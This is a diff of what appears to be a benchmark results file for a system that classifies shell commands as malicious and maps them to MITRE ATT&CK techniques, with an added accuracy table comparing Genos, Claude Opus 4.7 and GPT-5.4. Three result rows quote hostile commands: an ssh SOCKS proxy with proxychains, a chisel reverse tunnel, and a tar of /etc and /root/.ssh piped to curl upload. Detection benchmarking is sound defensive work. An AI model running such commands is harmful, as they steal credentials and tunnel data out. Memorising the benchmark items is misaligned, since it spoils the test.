@@ -741,3 +741,15 @@ Per-command results:
  709  hard       Malicious    ✓Malicious       ✓Malicious       T1210,T1029,T1020    T1090,T1059,T1105    ssh -D 9050 -fNq user@10.0.0.41 && proxychains wge
  710  hard       Malicious    ✗Suspicious      ✗Suspicious      T1210,T1105,T1011    T1090,T1572          chisel client 10.0.0.41:8080 R:8443:127.0.0.1:443
  711  hard       Malicious    ✓Malicious       ✓Malicious       T1020,T1210,T1029    T1041,T1005,T1074    tar cz /etc /root/.ssh 2>/dev/null | curl -X PUT h
+
+================================================================================
+  MITRE TECHNIQUE BENCHMARK (Test 2): Genos vs GPT-5.4 vs Claude Opus 4.7
+  Corpus : specialist_test_variant_a.jsonl  (119 classes, one sample per class)
+  Date   : 2026-04-20 16:30:42
+================================================================================
+
+System                Top-1    Top-3    Avg Latency
+-----------------------------------------------------
+Genos                 52.1%    63.9%       135ms
+Claude Opus 4.7       43.7%    57.1%     1,842ms
+GPT-5.4               39.5%    48.7%       918ms
